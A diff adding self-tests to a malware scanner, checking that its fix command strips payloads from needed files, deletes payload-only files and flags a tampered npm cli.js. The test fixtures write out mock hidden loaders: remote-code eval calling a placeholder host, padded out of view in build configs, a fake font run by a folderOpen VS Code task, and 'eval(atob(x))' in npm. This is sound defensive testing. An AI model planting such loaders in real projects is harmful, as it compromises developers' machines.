@@ -11,6 +11,11 @@ ST_PASS=0; ST_FAIL=0
 _st_ok(){   grn "  PASS  $*"; ST_PASS=$((ST_PASS+1)); }
 _st_bad(){  red "  FAIL  $*"; ST_FAIL=$((ST_FAIL+1)); }
 
+_st_gone(){  if [ -e "$1" ]; then _st_bad "$2"; else _st_ok "$2"; fi; }
+_st_kept(){  if [ -e "$1" ]; then _st_ok  "$2"; else _st_bad "$2"; fi; }
+_st_has(){   if grep -q "$2" "$1" 2>/dev/null; then _st_ok  "$3"; else _st_bad "$3"; fi; }
+_st_lacks(){ if grep -q "$2" "$1" 2>/dev/null; then _st_bad "$3"; else _st_ok  "$3"; fi; }
+
 # $1 = human label, $2 = expect (hit|clean), $3 = grep pattern, $4 = scan output
 #
 # Only [!] lines count as findings. A [~] note (e.g. "this line is long") is
@@ -120,6 +125,9 @@ JSON
   local selfout; selfout="$(cmd_scan_repo "$SNARE_ROOT" 2>&1)"
   _st_expect "snare's own lib/ not self-reported"    clean 'lib/scan\.sh'         "$selfout"
 
+  _st_remediation
+  _st_doctor
+
   if [ "$keep" = 1 ]; then dim "  kept: $T"; else rm -rf "$T"; fi
 
   hdr "RESULT"
@@ -130,4 +138,124 @@ JSON
   red "  $ST_FAIL of $((ST_PASS+ST_FAIL)) checks FAILED"
   red "  detection is broken — do not trust a 'clean' result until this passes"
   return 1
+}
+
+# Remediation must STRIP a file the project needs and DELETE only what is
+# payload and nothing else. `fix` used to delete any file containing an IOC
+# string — and the payload appended to postcss.config.mjs IS an IOC string, so
+# the build config was deleted before anything could strip it. Nothing asserted
+# otherwise, which is how it shipped.
+_st_remediation(){
+  hdr "Remediation (fix must strip what the project needs, not delete it)"
+  local R
+  R="$(mktemp -d "${TMPDIR:-/tmp}/snarefixtest.XXXXXX")" \
+    || { _st_bad "cannot create a temp directory"; return 1; }
+
+  ( cd "$R" || exit 1
+    git init -q . 2>/dev/null
+    git config user.email selftest@snare.local 2>/dev/null
+    git config user.name  "snare selftest"     2>/dev/null
+    python3 - <<'PY'
+import os
+P = ('global.i = "A8-0000-0";global.r=require,"object"==typeof module&&(global.m=module);'
+     'const http=require("node:http"),SENDER="0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a".toLowerCase(),'
+     'INDEXER_URL="https://eth.blockscout.com/api";async function l(u,k){const c=await get(k,u);eval(c),'
+     'spawn("node",["-e",c],{detached:!0}).unref()}await l(new URL("http://1.2.3.4:443/0x/cls"),"q4FZkxX");l();')
+
+# must survive, stripped: payload appended to the SAME line
+open("postcss.config.mjs", "w").write(
+    "export default { plugins: { autoprefixer: {} } };" + " " * 700 + P + "\n")
+# must survive, stripped: payload on a line of its OWN
+open("package.json", "w").write('{\n  "name": "victim",\n  "version": "1.0.0"\n}\n' + P + "\n")
+# payload and nothing else
+open("loader.js", "w").write(P + "\n")
+os.makedirs("public/fonts", exist_ok=True)
+open("public/fonts/fake.woff2", "w").write("require('child_process').spawn('node');\n")
+open("public/fonts/real.woff2", "wb").write(b"wOF2" + b"\0" * 400)
+open("setup_bun.js", "w").write("// worm artifact\n")
+open("index.js", "w").write("console.log('hello');\n")
+os.makedirs(".vscode", exist_ok=True)
+open(".vscode/tasks.json", "w").write("""{
+  "version": "2.0.0",
+  "tasks": [
+    { "label": "eslint-check", "command": "node ./public/fonts/fake.woff2",
+      "runOptions": { "runOn": "folderOpen" } },
+    { "label": "build", "command": "npm run build" }
+  ]
+}
+""")
+PY
+    git add -A >/dev/null 2>&1
+    git commit -qm "remediation fixtures" >/dev/null 2>&1
+    _fix_clean_tree selftest "$(ioc_pattern)" >/dev/null 2>&1
+  )
+
+  _st_kept  "$R/postcss.config.mjs"      "build config survives remediation"
+  _st_lacks "$R/postcss.config.mjs" blockscout "build config no longer carries the payload"
+  _st_has   "$R/postcss.config.mjs" autoprefixer "build config keeps what the project needs"
+  _st_kept  "$R/package.json"            "package.json survives remediation"
+  _st_lacks "$R/package.json" blockscout "package.json no longer carries the payload"
+  if python3 -c 'import json,sys; json.load(open(sys.argv[1]))' "$R/package.json" 2>/dev/null; then
+    _st_ok  "package.json is still valid JSON afterwards"
+  else
+    _st_bad "package.json is still valid JSON afterwards"
+  fi
+  _st_gone  "$R/loader.js"               "a file that is nothing but payload is removed"
+  _st_gone  "$R/public/fonts/fake.woff2" "a payload wearing a .woff2 extension is removed"
+  _st_gone  "$R/setup_bun.js"            "a known worm artifact is removed"
+  _st_kept  "$R/public/fonts/real.woff2" "a genuine font is left alone"
+  _st_kept  "$R/index.js"                "a clean source file is left alone"
+  _st_kept  "$R/.vscode/tasks.json"      "tasks.json survives when it has honest tasks too"
+  _st_has   "$R/.vscode/tasks.json" '"build"' "the project's own build task is kept"
+  _st_lacks "$R/.vscode/tasks.json" folderOpen "the folderOpen task is gone"
+
+  rm -rf "$R"
+}
+
+# The package manager is a file like any other. Nothing checked it until npm's
+# own lib/cli.js was found rewritten in place on a live host, so this asserts
+# both directions: a patched npm is flagged, an intact one is not.
+_st_doctor(){
+  hdr "Machine checks (doctor)"
+  local D
+  D="$(mktemp -d "${TMPDIR:-/tmp}/snaredoctor.XXXXXX")" \
+    || { _st_bad "cannot create a temp directory"; return 1; }
+
+  mkdir -p "$D/bad/bin"  "$D/bad/lib/node_modules/npm/lib"
+  mkdir -p "$D/good/bin" "$D/good/lib/node_modules/npm/lib"
+  printf '#!/bin/sh\nexit 0\n' > "$D/bad/bin/node";  chmod +x "$D/bad/bin/node"
+  printf '#!/bin/sh\nexit 0\n' > "$D/good/bin/node"; chmod +x "$D/good/bin/node"
+  # legit code, a long whitespace run, then the payload — the real signature
+  python3 - "$D/bad/lib/node_modules/npm/lib/cli.js" <<'PY'
+import sys
+open(sys.argv[1], "w").write(
+    "module.exports = (process) => validateEngines(process)" + " " * 200
+    + "/*RS260605*/global['e']='NPM';eval(atob(x));\n")
+PY
+  printf 'module.exports = (process) => validateEngines(process)\n' \
+    > "$D/good/lib/node_modules/npm/lib/cli.js"
+
+  local out
+  out="$(PATH="$D/bad/bin:$PATH" _doctor_node 2>&1)"
+  if printf '%s' "$out" | grep -q "$D/bad/.*cli\.js"; then
+    _st_ok  "a patched npm cli.js is flagged"
+  else
+    _st_bad "a patched npm cli.js is flagged (NOT detected — false clean)"
+  fi
+
+  out="$(PATH="$D/good/bin:$PATH" _doctor_node 2>&1)"
+  if printf '%s' "$out" | grep -q "$D/good/.*cli\.js"; then
+    _st_bad "an intact npm cli.js is left alone (reported, should be clean)"
+  else
+    _st_ok  "an intact npm cli.js is left alone"
+  fi
+
+  # guard_state must answer for THIS platform, not only for launchd. The bug
+  # it replaces reported "not installed" on Linux and Windows regardless.
+  case "$(guard_state)" in
+    running|stopped|absent) _st_ok "guard_state answers for $SNARE_OS" ;;
+    *)                      _st_bad "guard_state answers for $SNARE_OS" ;;
+  esac
+
+  rm -rf "$D"
 }
